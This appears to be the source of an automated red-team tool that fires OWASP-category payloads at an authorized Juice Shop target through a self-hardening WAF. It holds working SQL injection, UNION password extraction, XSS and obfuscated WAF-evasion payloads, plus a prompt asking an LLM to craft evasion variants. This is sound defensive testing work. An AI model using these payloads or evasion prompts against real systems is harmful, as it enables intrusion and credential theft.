// autopilot.js — Autonomous Red Team engine.
//
// Fires REAL, non-destructive payloads at the engagement's verified domain
// THROUGH the inline WAF reverse-proxy (/waf/:id/*). Each payload is judged
// blocked / bypassed / safe from the real response. On a bypass the system
// HARDENS: it writes a WAF signature so the same attack is blocked next time
// (self-strengthening firewall). Every step streams as a live "AI operator"
// narration + a morphing "probe" status over Socket.IO, so the UI can show the
// agent thinking and acting in real time.
//
// It covers 12 OWASP-category probes and, on the marquee SQLi finding, offers
// the operator a live "attempt to bypass the new rule" arms-race step.
//
// Mount in server.js:
//   import { autopilotRouter, attachAutopilotIo } from './autopilot.js';
//   app.use('/v1/redteam', autopilotRouter);
//   attachAutopilotIo(io);
//   io.on('connection', s => s.on('autopilot:watch', id => s.join('autopilot:' + id)));

import { Router } from 'express';
import { config } from './config.js';
import { gate, getEngagement, authorizeOwner } from './redteam.js';
import { pool } from './db.js'; // reuse the app's working Neon pool

const SELF = process.env.PUBLIC_BASE || `http://127.0.0.1:${config.port}`;
const GROQ_URL = 'https://api.groq.com/openai/v1/chat/completions';
const GROQ_MODEL = process.env.GROQ_MODEL || 'openai/gpt-oss-20b';

let IO = null;
export function attachAutopilotIo(io) { IO = io; }

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ---- schema -------------------------------------------------------------

async function ensureTables() {
  await pool.query(`
    create table if not exists autopilot_runs (
      id serial primary key,
      engagement_id text not null,
      status text not null default 'running',
      score int default 50,
      blocked int default 0,
      bypassed int default 0,
      signatures int default 0,
      findings jsonb default '[]'::jsonb,
      transcript jsonb default '[]'::jsonb,
      started_at timestamptz default now(),
      finished_at timestamptz
    )`);
  await pool.query(`
    create table if not exists waf_signatures (
      id serial primary key,
      engagement_id text not null,
      pattern text not null,
      technique text,
      created_at timestamptz default now()
    )`);
  await pool.query(`
    alter table autopilot_runs add column if not exists target text;
    alter table autopilot_runs add column if not exists score int default 50;
    alter table autopilot_runs add column if not exists blocked int default 0;
    alter table autopilot_runs add column if not exists bypassed int default 0;
    alter table autopilot_runs add column if not exists signatures int default 0;
    alter table autopilot_runs add column if not exists findings jsonb default '[]'::jsonb;
    alter table autopilot_runs add column if not exists transcript jsonb default '[]'::jsonb;
    alter table autopilot_runs add column if not exists finished_at timestamptz;
    alter table autopilot_runs alter column target drop not null;
  `);
}

// ---- attack surface -----------------------------------------------------
// Non-destructive, read-style probes only. No DROP/DELETE/UPDATE, no writes.
// Grouped into OWASP-category phases; 12 real findings against Juice Shop.

const PHASES = [
  { key: 'recon', name: 'Recon & mapping', owasp: '—', payloads: [
    { method: 'GET', path: '/rest/products', technique: 'recon', name: 'enumerate product API', recon: true, detect: () => false },
    { method: 'GET', path: '/api/Challenges', technique: 'recon', name: 'probe API surface', recon: true, detect: () => false },
  ]},
  { key: 'injection', name: 'Injection', owasp: 'A03', payloads: [
    { method: 'POST', path: '/rest/user/login', body: { email: "' OR 1=1--", password: 'x' },
      technique: 'sqli', name: 'SQL injection — auth bypass', sev: 'CRITICAL', signature: "' OR 1=1--", marquee: true,
      detect: (r) => /"token"|"authentication"/i.test(r.text) },
    { method: 'GET', path: "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--",
      technique: 'sqli', name: 'SQL injection — UNION extraction', sev: 'CRITICAL', signature: 'UNION SELECT',
      detect: (r) => (/@/.test(r.text) && /"data"\s*:\s*\[/.test(r.text)) || /SQLITE_ERROR|syntax error/i.test(r.text) },
    { method: 'GET', path: '/rest/products/search?q=%3Ciframe%20src%3Djavascript%3Aalert(1)%3E',
      technique: 'xss', name: 'Reflected XSS in search', sev: 'MEDIUM', signature: '<iframe src=javascript',
      detect: (r) => /<iframe src=javascript/i.test(r.text) },
  ]},
  { key: 'bac', name: 'Broken access control', owasp: 'A01', payloads: [
    { method: 'GET', path: '/api/Users/1', technique: 'bac', name: 'IDOR — read another user', sev: 'HIGH', signature: '/api/Users/',
      detect: (r) => /"email"\s*:/.test(r.text) && r.status < 400 },
    { method: 'GET', path: '/rest/basket/1', technique: 'bac', name: 'IDOR — read another basket', sev: 'HIGH', signature: '/rest/basket/',
      detect: (r) => /"ProductId"|"BasketItem"|"coupon"/i.test(r.text) && r.status < 400 },
    { method: 'GET', path: '/rest/admin/application-configuration', technique: 'bac', name: 'Admin configuration exposed', sev: 'HIGH', signature: '/rest/admin/',
      detect: (r) => /"config"|"application"|"theme"/i.test(r.text) && r.status < 400 },
  ]},
  { key: 'exposure', name: 'Sensitive data exposure', owasp: 'A02', payloads: [
    { method: 'GET', path: '/ftp/acquisitions.md', technique: 'exposure', name: 'Confidential file exposed', sev: 'HIGH', signature: '/ftp/',
      detect: (r) => r.status < 400 && /acquisition|confidential|merger|#|##/i.test(r.text) },
    { method: 'GET', path: '/ftp/legal.md', technique: 'exposure', name: 'FTP directory readable', sev: 'MEDIUM', signature: '/ftp/legal',
      detect: (r) => r.status < 400 && r.text.length > 20 },
  ]},
  { key: 'misconfig', name: 'Misconfiguration & components', owasp: 'A05', payloads: [
    { method: 'GET', path: '/metrics', technique: 'misconfig', name: 'Metrics endpoint exposed', sev: 'MEDIUM', signature: '/metrics',
      detect: (r) => r.status < 400 && /# HELP|# TYPE|process_|nodejs_/i.test(r.text) },
    { method: 'GET', path: '/rest/admin/application-version', technique: 'components', name: 'Version disclosure', sev: 'LOW', signature: 'application-version',
      detect: (r) => /"version"/i.test(r.text) && r.status < 400 },
  ]},
  { key: 'auth', name: 'Authentication failures', owasp: 'A07', payloads: [
    { method: 'POST', path: '/rest/user/login', body: { email: 'nobody@juice.sh', password: 'x' },
      technique: 'auth', name: 'No rate limiting on login', sev: 'HIGH', signature: 'login-bruteforce', repeat: 6,
      detect: (r) => r.status !== 429 },
  ]},
  { key: 'ssrf', name: 'SSRF / open redirect', owasp: 'A10', payloads: [
    { method: 'GET', path: '/redirect?to=https://offensive-ai.example.com', technique: 'ssrf', name: 'Open redirect', sev: 'MEDIUM', signature: 'redirect?to=',
      detect: (r) => (r.status >= 300 && r.status < 400) || /offensive-ai\.example|Location/i.test(r.text) },
  ]},
];

const totalPayloads = PHASES.reduce((n, p) => n + p.payloads.length, 0);

const REMEDIATION = {
  sqli: 'Use parameterized queries / prepared statements; never concatenate user input into SQL. Add an input-validation allowlist.',
  xss: 'Context-encode all output and apply a strict Content-Security-Policy; sanitize rich input server-side.',
  bac: 'Enforce server-side authorization on every object reference (verify the session owns the resource); deny by default.',
  exposure: 'Remove confidential files from web-reachable paths; require authentication and disable directory listing.',
  misconfig: 'Restrict operational endpoints (/metrics) to an internal network or behind auth; disable verbose errors in production.',
  components: 'Stop disclosing version banners; track dependencies and patch known CVEs on a schedule.',
  auth: 'Add rate limiting and account lockout/backoff on authentication endpoints; monitor for credential stuffing.',
  ssrf: 'Validate redirect targets against an allowlist; never redirect to raw user-supplied URLs.',
};

// ---- firing through the WAF --------------------------------------------

async function fire(id, p) {
  const url = `${SELF}/waf/${id}${p.path}`;
  const init = { method: p.method, headers: {} };
  if (p.body) { init.headers['content-type'] = 'application/json'; init.body = JSON.stringify(p.body); }
  try {
    const r = await fetch(url, init);
    const wafHdr = r.headers.get('x-offai-waf') || '';
    const text = await r.text().catch(() => '');
    const blocked = r.status === 403 && /block/i.test(wafHdr);
    return { status: r.status, wafHdr, text, blocked };
  } catch (e) {
    return { error: String(e).slice(0, 160), status: 0, text: '', blocked: false };
  }
}

async function harden(id, pattern, technique) {
  try {
    await pool.query(
      `insert into waf_signatures (engagement_id, pattern, technique) values ($1, $2, $3)`,
      [String(id), pattern, technique]);
  } catch { /* table may differ; non-fatal */ }
  return pattern;
}

// Ask the attacker LLM for ONE evolved, read-only evasion variant of a payload.
async function evolvePayload(basePath, technique, blockedPattern) {
  const key = process.env.GROQ_API_KEY;
  const fallback = {
    method: 'GET',
    path: "/rest/products/search?q=qwert%27%29%29%20uNiOn/**/SeLeCT%20id,email,password,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--",
    technique, name: 'evolved evasion variant', signature: 'uNiOn/**/SeLeCT',
    detect: (r) => (/@/.test(r.text) && /"data"\s*:\s*\[/.test(r.text)) || /SQLITE_ERROR|syntax/i.test(r.text),
  };
  if (!key) return fallback;
  try {
    const r = await fetch(GROQ_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${key}` },
      body: JSON.stringify({
        model: GROQ_MODEL, temperature: 0.7, max_tokens: 160,
        messages: [
          { role: 'system', content: 'You generate ONE short, non-destructive (read-only; no DROP/DELETE/UPDATE) WAF-evasion variant of a web search payload for an AUTHORIZED test. The firewall now blocks this exact pattern. Return ONLY the raw evasive query string value, no prose, no quotes.' },
          { role: 'user', content: `Blocked pattern: ${blockedPattern}. Give an evasive variant (case/encoding/comment tricks) that still triggers SQLi in a product search.` },
        ],
      }),
      signal: AbortSignal.timeout(12000),
    });
    if (!r.ok) return fallback;
    const data = await r.json();
    const raw = (data?.choices?.[0]?.message?.content || '').trim().replace(/^["'`]|["'`]$/g, '');
    if (!raw || raw.length > 300) return fallback;
    return {
      method: 'GET', path: '/rest/products/search?q=' + encodeURIComponent(raw),
      technique, name: 'evolved evasion variant', signature: raw.slice(0, 40),
      detect: (res) => (/@/.test(res.text) && /"data"\s*:\s*\[/.test(res.text)) || /SQLITE_ERROR|syntax|<iframe|<script/i.test(res.text),
    };
  } catch { return fallback; }
}

// ---- the run ------------------------------------------------------------

async function runAutopilot(id, runId) {
  const room = 'autopilot:' + id;
  const transcript = [];
  const findings = [];
  let blocked = 0, bypassed = 0, signatures = 0, score = 50, step = 0;

  const emit = (event, payload) => { if (IO) IO.to(room).emit(event, payload); };
  const narrate = (glyph, text, kind = 'info') => {
    const line = { ts: clock(), glyph, text, kind };
    transcript.push(line);
    emit('narration', line);
  };
  const setScore = () => {
    const total = blocked + bypassed || 1;
    score = Math.max(0, Math.min(100, Math.round(50 + 45 * (blocked / total) + signatures * 2 - bypassed)));
    emit('score', { value: score, blocked, bypassed, signatures });
  };

  // Fresh start: clear signatures learned in previous runs so this engagement
  // demonstrates the full bypass → learn → block cycle every time (demo-repeatable).
  try { await pool.query('delete from waf_signatures where engagement_id=$1', [String(id)]); } catch { /* non-fatal */ }

  const eng = await getEngagement(id);
  emit('start', { target: eng?.domain, plan: PHASES.map(p => ({ name: p.name, owasp: p.owasp })) });
  narrate('▸', `engagement #${id} authorized — ownership verified, human-approved`, 'run');
  narrate('▸', `locked target: ${eng?.domain} — scope re-checked on every request`, 'run');
  await sleep(400);

  for (let pi = 0; pi < PHASES.length; pi++) {
    const phase = PHASES[pi];
    emit('phase', { index: pi, name: phase.name, status: 'start' });
    narrate('▸', `phase ${pi + 1}/${PHASES.length} — ${phase.name}${phase.owasp !== '—' ? ' (' + phase.owasp + ')' : ''}`, 'run');
    await sleep(300);
    let phaseFindings = 0;

    for (const p of phase.payloads) {
      step++;
      // morphing "thinking" status for the spinner
      emit('probe', {
        index: step, total: totalPayloads, owasp: phase.owasp,
        name: p.recon ? ('Mapping — ' + p.name) : ('Probing ' + p.name),
        endpoint: `${p.method} ${p.path.split('?')[0]}`, phase: phase.name,
      });
      emit('progress', { overallPct: Math.round((step / totalPayloads) * 100), phasePct: 100, round: step, rounds: totalPayloads, phase: phase.name });
      narrate('→', p.recon ? `mapping ${p.path}` : `now probing — ${p.name}`, 'req');
      await sleep(560);

      // rate-limit probe fires several times
      let res = await fire(id, p);
      if (p.repeat) { for (let i = 1; i < p.repeat && !res.blocked; i++) { await sleep(120); res = await fire(id, p); } }

      if (res.error) { narrate('·', `request error: ${res.error}`, 'req'); continue; }

      if (p.recon) { narrate('·', `mapped (${res.status})`, 'req'); continue; }

      if (res.blocked) {
        blocked++; setScore();
        narrate('✓', `blocked by the firewall (${res.status})`, 'ok');
        emit('attempt', { technique: p.technique, payload: p.name, endpoint: p.path, verdict: 'BLOCKED' });
      } else if (p.detect(res)) {
        bypassed++; setScore();
        narrate('⚠', `payload bypassed the firewall — ${p.sev} weakness exposed (${res.status})`, 'byp');
        emit('attempt', { technique: p.technique, payload: p.name, endpoint: p.path, verdict: 'BYPASSED' });
        await sleep(360);
        const pattern = await harden(id, p.signature || p.path, p.technique);
        signatures++; setScore();
        narrate('✓', `signature learned — "${pattern}" now blocked for everyone`, 'ok');
        const f = {
          id: p.technique + '-' + step, name: p.name, severity: p.sev, owasp: phase.owasp,
          endpoint: `${p.method} ${p.path.split('?')[0]}`, payload: decodeURIComponent(p.path.split('?')[1] || JSON.stringify(p.body || '')),
          fix: REMEDIATION[p.technique] || 'Patch and re-test.',
          hardened: `firewall now blocks "${pattern}"`,
        };
        findings.push(f); phaseFindings++;
        emit('finding', f);
        await sleep(300);
        const again = await fire(id, p);
        if (again.blocked) { blocked++; setScore(); narrate('✓', 're-fired the same payload — now blocked (403)', 'ok'); }

        if (p.marquee) {
          emit('bypass_offer', { runId, technique: p.technique, endpoint: p.path, blockedPattern: pattern });
          narrate('▸', 'the firewall just hardened — an operator may now request a bypass attempt', 'run');
        }
      } else {
        narrate('·', `origin handled it safely — no weakness (${res.status})`, 'req');
        emit('attempt', { technique: p.technique, payload: p.name, endpoint: p.path, verdict: 'SAFE' });
      }
      await persist(runId, { status: 'running', score, blocked, bypassed, signatures, findings, transcript });
    }

    emit('phase', { index: pi, name: phase.name, status: 'done', findings: phaseFindings });
    await sleep(240);
  }

  await persist(runId, { status: 'done', score, blocked, bypassed, signatures, findings, transcript, finished: true });
  narrate('✓', `engagement complete — ${findings.length} vulnerabilities found & hardened, score ${score}`, 'ok');
  emit('done', { score, blocked, bypassed, signatures, findings });
}

// Operator-triggered arms-race: evolve the SQLi, try to bypass the new rule, re-harden.
async function runBypass(id, runId, blockedPattern) {
  const room = 'autopilot:' + id;
  const emit = (event, payload) => { if (IO) IO.to(room).emit(event, payload); };
  const ts = () => clock();
  const narrate = (glyph, text, kind = 'info') => emit('narration', { ts: ts(), glyph, text, kind });

  emit('probe', { index: 0, total: 0, owasp: 'A03', name: 'Evolving evasion payload', endpoint: 'mutating the blocked rule', phase: 'Bypass attempt' });
  narrate('▸', 'operator authorized a bypass attempt against the new rule', 'run');
  await sleep(400);

  const evolved = await evolvePayload('/rest/products/search', 'sqli', blockedPattern || 'UNION SELECT');
  narrate('→', `evolving: ${decodeURIComponent(evolved.path.split('?')[1] || '')}`.slice(0, 140), 'req');
  await sleep(700);

  const res = await fire(id, evolved);
  if (res.error) { narrate('·', `request error: ${res.error}`, 'req'); emit('bypass_result', { evaded: false, error: true }); return { evaded: false }; }

  if (res.blocked) {
    narrate('✓', 'evolved payload was blocked immediately — the firewall generalized. It held.', 'ok');
    emit('bypass_result', { evaded: false });
    return { evaded: false };
  }
  if (evolved.detect(res)) {
    narrate('⚠', 'evolved payload EVADED the new rule — bypass succeeded again', 'byp');
    await sleep(450);
    const pattern = await harden(id, evolved.signature, 'sqli');
    narrate('✓', `stronger signature learned — "${pattern}" and its evasion family now blocked`, 'ok');
    await sleep(350);
    const again = await fire(id, evolved);
    const held = again.blocked;
    narrate(held ? '✓' : '·', held ? 're-fired the evasion — blocked. firewall adapted and held.' : 're-fired — still forwarding; needs another pass.', held ? 'ok' : 'req');
    emit('bypass_result', { evaded: true, held });
    // reflect the new signature in the run record
    try {
      const { rows } = await pool.query('select signatures, bypassed, score from autopilot_runs where id=$1', [runId]);
      const s = rows[0] || {};
      await pool.query('update autopilot_runs set signatures=$2, bypassed=$3 where id=$1',
        [runId, (s.signatures || 0) + 1, (s.bypassed || 0) + 1]);
    } catch { /* non-fatal */ }
    return { evaded: true, held };
  }
  narrate('·', 'evolved payload forwarded but triggered nothing — origin held.', 'req');
  emit('bypass_result', { evaded: false });
  return { evaded: false };
}

// ---- helpers ------------------------------------------------------------

function clock() { return new Date().toTimeString().slice(0, 8); }
async function persist(runId, s) {
  try {
    await pool.query(
      `update autopilot_runs set status=$2, score=$3, blocked=$4, bypassed=$5, signatures=$6,
        findings=$7::jsonb, transcript=$8::jsonb, finished_at=$9 where id=$1`,
      [runId, s.status, s.score, s.blocked, s.bypassed, s.signatures,
       JSON.stringify(s.findings), JSON.stringify(s.transcript), s.finished ? new Date() : null]);
  } catch { /* non-fatal */ }
}

// ---- routes -------------------------------------------------------------

export const autopilotRouter = Router();

autopilotRouter.post('/engagements/:id/autopilot', async (req, res) => {
 try {
  const id = req.params.id;
  const eng = await getEngagement(id);

  const own = await authorizeOwner(req, eng);
  if (!own.ok) return res.status(own.status).json({ error: own.reason });

  const g = gate(eng, 'https://' + eng.domain);
  if (!g.ok) return res.status(403).json({ error: 'engagement not authorized', reason: g.reason });

  await ensureTables();
  const ins = await pool.query(
    `insert into autopilot_runs (engagement_id, target, status) values ($1, $2, 'running') returning id`,
    [String(id), eng.domain]);
  const runId = ins.rows[0].id;

  runAutopilot(id, runId).catch(err => {
    if (IO) IO.to('autopilot:' + id).emit('narration', { ts: clock(), glyph: '·', text: 'run error: ' + String(err).slice(0, 160), kind: 'req' });
  });

  res.json({ started: true, runId, room: 'autopilot:' + id });
 } catch (e) {
  console.error('[autopilot]', e);
  res.status(500).json({ error: 'autopilot failed to start', detail: String(e).slice(0, 200) });
 }
});

// Operator-triggered bypass of the firewall's own freshly-learned rule.
autopilotRouter.post('/engagements/:id/autopilot/:runId/bypass', async (req, res) => {
 try {
  const id = req.params.id;
  const eng = await getEngagement(id);
  const own = await authorizeOwner(req, eng);
  if (!own.ok) return res.status(own.status).json({ error: own.reason });

  const blockedPattern = (req.body && req.body.blockedPattern) || 'UNION SELECT';
  runBypass(id, req.params.runId, blockedPattern).catch(err => {
    if (IO) IO.to('autopilot:' + id).emit('narration', { ts: clock(), glyph: '·', text: 'bypass error: ' + String(err).slice(0, 160), kind: 'req' });
  });
  res.json({ started: true, room: 'autopilot:' + id });
 } catch (e) {
  console.error('[autopilot:bypass]', e);
  res.status(500).json({ error: 'bypass failed to start', detail: String(e).slice(0, 200) });
 }
});
